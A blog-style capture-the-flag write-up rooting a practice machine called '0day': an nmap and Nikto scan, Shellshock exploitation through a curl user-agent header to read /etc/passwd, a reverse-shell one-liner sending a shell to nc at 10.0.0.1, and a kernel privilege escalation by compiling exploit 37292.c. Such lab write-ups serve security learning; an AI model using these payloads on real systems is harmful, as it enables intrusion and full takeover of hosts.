---
layout: default
title : muzec - 0day Writeup
---

![Image](https://imgur.com/TApyiQS.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 05:33 EST
Nmap scan report for 10.10.78.18
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.95 seconds
```

Just 2 open ports 22,80 let hit port 80 to see what is running....

![Image](https://imgur.com/uk7OYXp.png)

Hmm a simple page nothing in the source page also let try and run Nikto on it are you thinking what is Nikto?? Nikto is a free software command-line vulnerability scanner that scans webservers for dangerous files/CGIs, outdated server software and other problems. It performs generic and server type specific checks. It also captures and prints any cookies received.

Scanning with nikto we got some good result.

![Image](https://imgur.com/7QJQAc4.png)

Yea you see it clear it a f#cking 'shellshock' vulnerability cool so fast also let exploit it.

/cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability let try some shellshock command first of all let try to read /etc/passwd file.

```curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <Target-IP>/cgi-bin/test.cgi```

![Image](https://imgur.com/u1ozFmr.png)

Boom hell yea... Let get a [reverse shell](https://muzec0318.github.io/posts/ReverseShell.html) easily by editing the command check down below;

```curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'" <Target-IP>/cgi-bin/test.cgi```

Open another terminal to start an Ncat listener.

![Image](https://imgur.com/wX7jQWo.png)

Now let hit the command...

```curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'" <Target-IP>/cgi-bin/test.cgi```

![Image](https://imgur.com/NhdVbHH.png)

Going back to our Ncat listener we have a shell already pretty sweet right?? [let spawn a tty shell](https://muzec0318.github.io/posts/Ttyshells.html) to bring out the beauty lol.

```python -c 'import pty; pty.spawn("/bin/bash")'```

![Image](https://imgur.com/FJCU7i4.png)

Now let go get our user.txt in the home directory.

![Image](https://imgur.com/aj8g1rw.png)

Boom time to root the box Privilege Escalation, what is Privilege Escalation? Privilege escalation is the act of exploiting a bug, design flaw or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user.

Let check the version of the operating system first ```uname -a```

![Image](https://imgur.com/YCDMRns.png)

Hmmm pretty old right?? let do a little research on it.

![Image](https://imgur.com/t1fO9Nm.png)

Boom we have a lead let hit it...... let download exploit to our machine.

![Image](https://imgur.com/acl1XV4.png)

Cool now let get it to the target machine we can easily use SimpleHTTPServer to transfer our file.

![Image](https://imgur.com/XM9Wbxf.png)

Now let change directory to /tmp in the target machine to wget the exploit.

![Image](https://imgur.com/EjelFQc.png)

Cool now let complie the exploit and run it we can easily complie it with gcc like ```gcc 37292.c -o exploit```

![Image](https://imgur.com/6pYnEOX.png)

Now let run it...

![Image](https://imgur.com/NRqfweQ.png)

We are root 0day box rooted hope you have fun??? 

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
